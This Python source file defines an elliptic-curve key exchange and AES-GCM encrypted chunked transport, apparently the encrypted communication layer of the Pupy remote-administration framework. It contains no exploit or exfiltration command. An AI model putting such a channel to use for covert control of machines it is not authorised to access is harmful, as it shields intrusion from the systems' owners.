# -*- coding: utf-8 -*-

""" EC4 PSK transport """

__all__ = ('ECMTransportServer', 'ECMTransportClient')

from ..base import BasePupyTransport
from ...lib.picocmd.ecpv import ECPV

from network.lib.buffer import Buffer

import struct
import time
import random

from Crypto.Cipher import AES
from Crypto.Hash   import SHA3_224
from Crypto.Hash   import SHA384
from Crypto.Random import get_random_bytes

class ECMTransport(BasePupyTransport):
    __slots__ = (
        'encryptor', 'decryptor',
        'up_buffer', 'dec_buffer',
        'nonce', 'key', 'chunk_len',
        'need_validation', 'encoder'
    )

    privkey = None
    pubkey  = None

    def __init__(self, *args, **kwargs):
        super(ECMTransport, self).__init__(*args, **kwargs)
        if not self.pubkey and not self.privkey:
            raise ValueError('Public or Private key required for ECM')

        if self.pubkey:
            self.encoder = ECPV(
                curve='brainpoolP384r1',
                public_key=self.pubkey,
                hash=SHA384
            )
        else:
            self.encoder = ECPV(
                curve='brainpoolP384r1',
                public_key=self.privkey,
                hash=SHA384
            )

        self.encryptor       = None
        self.decryptor       = None
        self.up_buffer       = Buffer()
        self.dec_buffer      = Buffer()
        self.nonce           = None
        self.key             = None
        self.chunk_len       = 0
        self.need_validation = False

    def update_encryptor(self):
        vblock = self.encryptor.digest()

        h = SHA3_224.new()
        h.update(self.key[0])
        h.update(vblock)
        self.encryptor = AES.new(
            key=self.key[0], mode=AES.MODE_GCM, nonce=h.digest()
        )

        return vblock

    def update_decryptor(self, vblock):
        self.decryptor.verify(vblock)

        h = SHA3_224.new()
        h.update(self.key[1])
        h.update(vblock)
        self.decryptor = AES.new(
            key=self.key[1], mode=AES.MODE_GCM, nonce=h.digest()
        )

    def kex(self, data):
        if len(data) < 4:
            return False

        reqlen, noncelen = struct.unpack_from('<HH', data.peek(4))
        if len(data) < 4 + reqlen + noncelen:
            return False

        data.drain(4)

        request = data.read(reqlen)
        remote_nonce = data.read(noncelen)

        if self.privkey:
            response, key = self.encoder.process_kex_request(request, 0)
            # Add jitter, tinyec is quite horrible
            time.sleep(random.random())
            nonce = get_random_bytes(16)
            self.downstream.write(struct.pack('<HH', len(response), len(nonce)) + response + nonce)
        else:
            key = self.encoder.process_kex_response(request, 0)
            nonce = self.nonce

        eh = SHA3_224.new()
        eh.update(key[0])
        eh.update(remote_nonce)
        ek = eh.digest()[:16]

        dh = SHA3_224.new()
        dh.update(key[1])
        dh.update(nonce)
        dk = dh.digest()[:16]

        self.key = (ek, dk)

        self.encryptor = AES.new(key=self.key[0], mode=AES.MODE_GCM, nonce=nonce)
        self.decryptor = AES.new(key=self.key[1], mode=AES.MODE_GCM, nonce=remote_nonce)

        return True

    def downstream_recv(self, data):
        if self.decryptor:
            while len(data):
                if not self.chunk_len:
                    if self.need_validation:
                        if len(data) < 16:
                            return

                        vblock = data.read(16)
                        self.update_decryptor(vblock)
                        self.need_validation = False
                        self.dec_buffer.write_to(self.upstream)

                    if len(data) < 4:
                        break

                    raw_chunk_len = self.decryptor.decrypt(data.read(4))
                    self.chunk_len, = struct.unpack('<I', raw_chunk_len)

                if not len(data):
                    break

                nr, nw = data.write_to(
                    self.dec_buffer,
                    modificator=self.decryptor.decrypt,
                    n=self.chunk_len)

                self.chunk_len -= nr
                if not self.chunk_len:
                    self.need_validation = True

        elif self.kex(data):
            if len(self.up_buffer):
                self.upstream_recv(self.up_buffer)

            if len(data):
                self.downstream_recv(data)

    def upstream_recv(self, data):
        if self.encryptor:
            buf = Buffer()

            ldata = len(data)
            buf.write(self.encryptor.encrypt(struct.pack('<I', ldata)))
            _, nw = data.write_to(buf, modificator=self.encryptor.encrypt, n=ldata)
            d = self.update_encryptor()
            buf.write(d)

            buf.write_to(self.downstream)
        else:
            data.write_to(self.up_buffer)

class ECMTransportServer(ECMTransport):
    __slots__ = ()

class ECMTransportClient(ECMTransport):
    __slots__ = ()

    def on_connect(self):
        req = self.encoder.generate_kex_request()
        self.nonce = get_random_bytes(16)
        self.downstream.write(
            struct.pack('<HH', len(req), len(self.nonce)) + req + self.nonce
        )
